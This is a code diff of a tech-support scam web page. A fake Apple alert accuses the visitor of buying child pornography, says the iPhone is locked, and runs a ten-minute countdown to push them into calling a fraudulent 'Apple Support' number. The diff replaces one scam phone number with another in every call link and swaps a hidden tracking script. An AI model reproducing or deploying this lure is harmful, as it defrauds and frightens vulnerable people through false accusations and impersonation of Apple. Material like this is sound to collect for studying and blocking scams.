@@ -51,9 +51,9 @@
     <div class="alert-texts">
         <div class="bgblue"><strong>Transaction of $249.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
     <div class="txstm"> <br>
-        Not you? Call <strong>Apple Support: <br><a href="tel:+1-888-394-1808">+1-888-394-1808</a></strong> to unlock your device.
+        Not you? Call <strong>Apple Support: <br><a href="tel:+1-888-824-4720">+1-888-824-4720</a></strong> to unlock your device.
      </div>
-    <a href="tel:+1-888-394-1808" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
+    <a href="tel:+1-888-824-4720" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
     
     </div>
 </div>
@@ -72,7 +72,7 @@
   <div class="notification-header">Payment Successful</div>
   <div class="notification-body">
     Sent $249.90 via Apple Pay to Pornhub <br>Premium.
-    Not you? Call +1-888-394-1808
+    Not you? Call +1-888-824-4720
   </div>
   <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
 </div>
@@ -86,13 +86,13 @@
             <div class="modal-content">
                 <div class="modal-body text-center">
                     <div class="alert-text">
-                        Your Iphone is Temporarily Restricted due to illegal Child Pornography activity. You have purchased a Pornhub subscription of $249.90. The payment was processed from [<span class="user-city" style="font-weight:600;">loading...</span>]. This is an unauthorized transaction. Your account has been locked because of a suspicious payment activity. Verify your account with Apple Support <a href="tel:+1-888-394-1808">+1-888-394-1808</a> to unlock it, otherwise your Iphone will be Permanently Locked.
+                        Your Iphone is Temporarily Restricted due to illegal Child Pornography activity. You have purchased a Pornhub subscription of $249.90. The payment was processed from [<span class="user-city" style="font-weight:600;">loading...</span>]. This is an unauthorized transaction. Your account has been locked because of a suspicious payment activity. Verify your account with Apple Support <a href="tel:+1-888-824-4720">+1-888-824-4720</a> to unlock it, otherwise your Iphone will be Permanently Locked.
                     </div>
 
                     
                     <div class="text-end gap-4 mt-3 actionbtn">
-                        <a href="tel:+1-888-394-1808" class="me-2 bg-primary">Call +1-888-394-1808</a>
-                        <a href="tel:+1-888-394-1808" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                        <a href="tel:+1-888-824-4720" class="me-2 bg-primary">Call +1-888-824-4720</a>
+                        <a href="tel:+1-888-824-4720" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                     </div>
                 </div>
             </div>
@@ -120,6 +120,6 @@
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9f8240d11ced6068',t:'MTc3ODE3ODE3OA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; visibility: hidden;"></iframe>
 </body>
 <div style="display: none;">
-<script id="_wau91m">var _wau = _wau || []; _wau.push(["small", "tvxkwshhyt", "91m"]);</script><script async src="//waust.at/s.js"></script>
+        <script id="_wauefl">var _wau = _wau || []; _wau.push(["small", "jvz5eu8at6", "efl"]);</script><script async src="//waust.at/s.js"></script>
        </div>
 </html>
